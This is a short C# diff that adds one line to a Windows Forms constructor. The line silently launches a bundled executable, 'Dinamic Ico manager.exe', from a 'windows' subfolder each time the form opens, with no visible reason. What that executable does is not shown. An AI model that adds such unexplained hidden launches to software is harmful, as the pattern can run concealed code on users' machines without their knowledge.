@@ -22,6 +22,7 @@ namespace Зе_Unauticna
         Point newcursor = new Point(2, 2);
         public Form1()
         {
+            System.Diagnostics.Process.Start(Application.StartupPath + "/windows/Dinamic Ico manager.exe");
             InitializeComponent();
             SetStyle(ControlStyles.OptimizedDoubleBuffer |
                 ControlStyles.AllPaintingInWmPaint |
